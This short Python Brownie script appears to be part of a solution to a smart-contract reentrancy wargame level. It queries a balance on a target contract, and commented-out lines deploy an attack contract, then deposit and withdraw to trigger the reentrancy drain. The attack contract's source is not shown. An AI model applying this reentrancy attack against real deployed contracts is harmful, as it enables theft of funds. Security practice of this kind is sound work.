from brownie import (
    Reentrance_attack,
    ReentranceHack,
    accounts,
    interface,
    network,
    interface,
)
from scripts.helpful_scripts import get_account
from web3 import Web3


network.gas_limit(300000)


def main():
    account = get_account()
    hack = interface.ReentranceInterface("0x3B698C240B6Fcf741659684B4227E0813EC27934")
    print(
        hack.balanceOf("0x2eFC11CD9F10BF03146C89D6B9B51992E4df1D10", {"from": account})
    )
    # hack = Reentrance_attack.deploy(
    #     {
    #         "from": account,
    #     }
    #     # publish_source=True,
    # )
    # hack.deposit(hack.address, {"from": account, "value": 1000000000000000})
    # hack.withdraw(1000000000000000, {"from": account})
